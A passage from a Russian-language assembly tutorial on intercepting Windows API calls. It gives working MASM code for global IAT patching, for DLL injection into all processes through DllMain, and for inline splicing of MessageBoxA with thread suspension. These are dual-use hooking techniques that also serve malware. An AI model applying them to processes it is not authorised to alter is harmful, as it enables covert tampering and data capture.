<span style="color: black; font-style: italic;">;Процедура EditIATGlobal &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br />
<span style="color: black; font-style: italic;">;Описание:</span><br />
<span style="color: black; font-style: italic;">;Перехват вызовов функций редактированием IAT во всех модулях процесса</span><br />
<span style="color: black; font-style: italic;">;Вход: Address адрес внутри файла в памяти</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; ModName - указатель на имя модуля, IAT которого мы будем править. </span><br />
<span style="color: black; font-style: italic;">; &nbsp; Регистр не важен.</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; Orig - адрес функции, которую перехватываем</span><br />
<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; New - адрес нашего обработчика</span><br />
<span style="color: black; font-style: italic;">;Выход: нет</span><br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
EditIATGlobal proc ModName<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> Orig<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> New<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
LOCAL Current<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
LOCAL hSnap<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> offset NextMod<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> GetBase<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> Current<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black; font-style: italic;">;Получили хэндл своего модуля</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke CreateToolhelp32Snapshot<span style="color: #339933;">,</span>TH32CS_SNAPMODULE<span style="color: #339933;">,</span>NULL<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> hSnap<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> ModEntry<span style="color: #339933;">.</span>dwSize<span style="color: #339933;">,</span>sizeof MODULEENTRY32<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke Module32First<span style="color: #339933;">,</span>hSnap<span style="color: #339933;">,</span>offset ModEntry<br />
NextMod<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>Current<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF <span style="color: #46aa03; font-weight: bold;">eax</span>!=ModEntry<span style="color: #339933;">.</span>hModule<span style="color: black; font-style: italic;">;В своем модуле не будем перехватывать!</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> ModEntry<span style="color: #339933;">.</span>hModule<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> New<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> Orig<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> ModName<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> EditIATLocal<span style="color: black; font-style: italic;">;Перехватываем в этом модуле</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke Module32Next<span style="color: #339933;">,</span>hSnap<span style="color: #339933;">,</span>offset ModEntry<span style="color: black; font-style: italic;">;Следующий модуль</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF <span style="color: #46aa03; font-weight: bold;">eax</span>!=<span style="color: #ff0000;">0</span> <br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> NextMod<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke CloseHandle<span style="color: #339933;">,</span>hSnap<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
EditIATGlobal endp<br />
<span style="color: black; font-style: italic;">;===============================================================================;</span><br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>В функции DLLMain DLL, которую мы впоследствии будем внедрять во все процессы мы должны обрабатывать reason следующим образом:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">DllEntry proc hInstance<span style="color: #339933;">:</span>HINSTANCE<span style="color: #339933;">,</span> reason<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> reserved1<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">ebp</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if reason==DLL_PROCESS_ATTACH<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Получаем описатель модуля, где нах-ся перехватываемая функция</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke GetModuleHandle<span style="color: #339933;">,</span>offset nt<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke GetProcAddress<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>offset Exitstr<span style="color: black; font-style: italic;">;ExitStr - имя перехватываемой функции</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> offset <span style="color: #0000ff; font-weight: bold;">start</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> offset nt<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Устанавливаем перехват функции Exitstr из модуля nt.</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> EditIATGlobal<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>elseif reason==DLL_PROCESS_DETACH<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>elseif reason==DLL_THREAD_ATTACH<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>else &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; DLL_THREAD_DETACH</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">ebp</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp;<span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>TRUE<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
DllEntry Endp<br />
&nbsp;</div>
<p>Пример Закончен.</p>
<h4><a name="c462"></a>Простой пример - перехват MessageBox</h4>
<p>Я приложил к статье исходный код DLL, которая перехватывает функции USER32.DLL!MessageBoxA и USER32.DLL!MessageBoxW в целевом процессе. Файлы исходного кода этой DLL находиться в папке HookMessBox. Чтобы посмотреть как работает перехват этих функций Вы можете использовать для внедрения мою программу DLL Injector. Например, попробуйте внедрить эту DLL в блокнот, напечатать чего-нибудь и потом нажать на крестик закрытия окна.</p>
<h4><a name="c463"></a>Перехват LoadLibrary</h4>
<p>Чтобы распространить перехват на новые подгружаемые DLL, необходимо перехватывать KERNEL32.DLL!LoadLibrary. Используя функцию EditIATLocal Вы сможете с легкостью перехватить вызов KERNEL32.DLL!LoadLibrary таким образом, чтобы после загрузки новой DLL она сразу же обрабатывалась.</p>
<h3><a name="c47"></a>Сплайсинг</h3>
<p>Сначала определяется адрес функции, которую надо перехватить. Первый несколько байт данной функции заменяются на переход к нашему обработчику. Теперь, если будет вызвана перехватываемая функция, то произойдет переход на наш обработчик. Если нужно вызвать оригинальную функцию, то необходимо восстановить исходные байты. С помощью этого метода перехватываются абсолютно все вызовы из любых модулей, и при этом не надо делать ничего дополнительного. Этот метод хорош во всех отношениях, если бы не одно НО...Люди, которые понимают что-нибудь в многозадачности сразу учуяли что-то не-то. Представьте, что какой-то поток правит начало функции джапмом, но вдруг ОС отнимает у него управление и передает его другому потоку. А тот обращается к недоконца подправленной функции. В итоге произойдет ошибка и приложение, скорее всего, слетит. Есть решение этой проблемы, - останавливать все потоки, когда начало функции правиться и когда вызывается ее перехватчик (ведь перехватчик тоже правит начало функции, чтобы вызывать ее оригинал). Все эти вещи реализуются очень просто. Давайте рассмотрим функции, которые приостанавливают и запускают потоки, соответственно. Нашей задачей опять будет перехват функций USER32.DLL!MessageBoxA.</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;Приостановка всех потоков, кроме вызывающего</span><br />
SuspendThreads proc<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetModuleHandle<span style="color: #339933;">,</span>offset kern<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetProcAddress<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>offset OpenThreadStr<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> _OpenThread<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetCurrentThreadId<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> CurrThread<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetCurrentProcessId<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> CurrProcess<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke CreateToolhelp32Snapshot<span style="color: #339933;">,</span>TH32CS_SNAPTHREAD<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> hSnap<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> Thread<span style="color: #339933;">.</span>dwSize<span style="color: #339933;">,</span>sizeof THREADENTRY32<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke Thread32First<span style="color: #339933;">,</span>hSnap<span style="color: #339933;">,</span>offset Thread<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
NextThread<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>CurrThread<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>CurrProcess<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: black;">&#40;</span>Thread<span style="color: #339933;">.</span>th32ThreadID!=<span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#41;</span>&amp;&amp;<span style="color: black;">&#40;</span>Thread<span style="color: #339933;">.</span>th32OwnerProcessID==<span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> Thread<span style="color: #339933;">.</span>th32ThreadID<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> NULL<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> THREAD_SUSPEND_RESUME<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> _OpenThread<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> ThreadHandle<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if ThreadHandle&gt;<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke SuspendThread<span style="color: #339933;">,</span>ThreadHandle<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke CloseHandle<span style="color: #339933;">,</span>ThreadHandle<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke Thread32Next<span style="color: #339933;">,</span>hSnap<span style="color: #339933;">,</span>offset Thread<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>!=<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> NextThread<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif <br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke CloseHandle<span style="color: #339933;">,</span>hSnap<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
SuspendThreads endp<br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;Возобновление всех потоков</span><br />
ResumeThreads proc<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetModuleHandle<span style="color: #339933;">,</span>offset kern<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetProcAddress<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>offset OpenThreadStr<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> _OpenThread<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetCurrentThreadId<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> CurrThread<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetCurrentProcessId<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> CurrProcess<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke CreateToolhelp32Snapshot<span style="color: #339933;">,</span>TH32CS_SNAPTHREAD<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> hSnap<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> Thread<span style="color: #339933;">.</span>dwSize<span style="color: #339933;">,</span>sizeof THREADENTRY32<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke Thread32First<span style="color: #339933;">,</span>hSnap<span style="color: #339933;">,</span>offset Thread<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
NextThread<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>CurrThread<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>CurrProcess<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: black;">&#40;</span>Thread<span style="color: #339933;">.</span>th32ThreadID!=<span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#41;</span>&amp;&amp;<span style="color: black;">&#40;</span>Thread<span style="color: #339933;">.</span>th32OwnerProcessID==<span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> Thread<span style="color: #339933;">.</span>th32ThreadID<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> NULL<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> THREAD_SUSPEND_RESUME<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> _OpenThread<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> ThreadHandle<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if ThreadHandle&gt;<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke ResumeThread<span style="color: #339933;">,</span>ThreadHandle<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke CloseHandle<span style="color: #339933;">,</span>ThreadHandle<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke Thread32Next<span style="color: #339933;">,</span>hSnap<span style="color: #339933;">,</span>offset Thread<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>!=<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> NextThread<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke CloseHandle<span style="color: #339933;">,</span>hSnap<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
ResumeThreads endp<br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>В процедуру ResumeThreads не учитывается, что поток можем остановить не мы. Но это допущение для большинства приложений не является критическим.</p>
<h4><a name="c471"></a>Простой пример - перехват MessageBox</h4>
<p>После того, как мы нашли реальный адрес функции MessageBoxA, мы сохраняет старые 6 байт по некоторому адресу. Далее мы записываем по этому адресу переход на наш обработчик. Код перехода выглядит так:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">code1 label <span style="color: #0000ff; font-weight: bold;">byte</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">68h</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ОПКОД команды PUSH</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Hooker1 <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">0</span>&nbsp; &nbsp; <span style="color: black; font-style: italic;">;ОПЕРАНД команды PUSH</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0c3h</span>&nbsp; &nbsp; <span style="color: black; font-style: italic;">;ОПКОД RET</span><br />
size_code1&nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span>code1<br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>А вот функция, которая как раз делает то, к чему мы стремились - осуществляет перехват:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">SetHook proc NameFunc<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">dword</span><span style="color: #339933;">,</span>NameModul<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">dword</span> <br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetModuleHandle<span style="color: #339933;">,</span>NameModul<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetProcAddress<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>NameFunc<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> RealAddr1<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;сохраняем адрес перехватываемой функции</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke ReadProcessMemory<span style="color: #339933;">,-</span><span style="color: #ff0000;">1</span><span style="color: #339933;">,</span>RealAddr1<span style="color: #339933;">,</span>offset Old_Code1<span style="color: #339933;">,</span>size_code1<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> Hooker1<span style="color: #339933;">,</span>offset Hooker<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke WriteProcessMemory<span style="color: #339933;">,-</span><span style="color: #ff0000;">1</span><span style="color: #339933;">,</span>RealAddr1<span style="color: #339933;">,</span>offset code1<span style="color: #339933;">,</span>size_code1<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
SetHook endp<br />
&nbsp;</div>
<p>Пример Закончен.</p>
